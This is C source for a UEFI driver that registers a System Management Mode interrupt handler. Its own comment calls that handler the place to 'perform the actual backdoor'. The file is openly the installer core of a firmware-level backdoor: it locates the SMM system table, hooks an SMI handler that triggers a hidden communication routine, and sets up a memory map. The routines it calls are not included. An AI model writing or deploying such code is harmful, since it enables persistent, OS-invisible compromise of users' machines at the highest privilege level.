#pragma optimize("", off)
#include <Library/SmmCpuRendezvousLib.h>
#include "windows.h"
#include "communication.h"

EFI_SMM_BASE2_PROTOCOL* SmmBase2;
EFI_SMM_SYSTEM_TABLE2* GSmst2;
VOID EFIAPI ClearCache();

EFI_STATUS EFIAPI SmiHandler(EFI_HANDLE dispatch, CONST VOID* context, VOID* buffer, UINTN* size)
{
	// This is redundant but is done for security reasons. rendezvous
	if(EFI_ERROR(SmmWaitForAllProcessor(TRUE)))
	{
		//while(TRUE){}
		return EFI_SUCCESS;
	}

	// Perform the actual backdoor
	PerformCommunication();

	// Make sure we are not running into a cache side channel attack. When the system leaves SMM it might clear cache.
	//ClearCache();

	return EFI_SUCCESS;
}

EFI_STATUS EFIAPI UefiMain(IN EFI_LOADED_IMAGE* image, IN EFI_SYSTEM_TABLE* table)
{
	gRT = table->RuntimeServices;
	gBS = table->BootServices;
	gST = table;

	if (EFI_ERROR(gBS->LocateProtocol(&gEfiSmmBase2ProtocolGuid, 0, (void**)&SmmBase2)))
	{
		return EFI_SUCCESS;
	}

	if (EFI_ERROR(SmmBase2->GetSmstLocation(SmmBase2, &GSmst2)))
	{
		return EFI_SUCCESS;
	}

	EFI_HANDLE handle;
	GSmst2->SmiHandlerRegister(&SmiHandler, NULL, &handle);

	if (EFI_ERROR(SetupMemoryMap()))
	{
		return EFI_ERROR_MAJOR;
	}

	return EFI_SUCCESS;
}
#pragma optimize("", on)
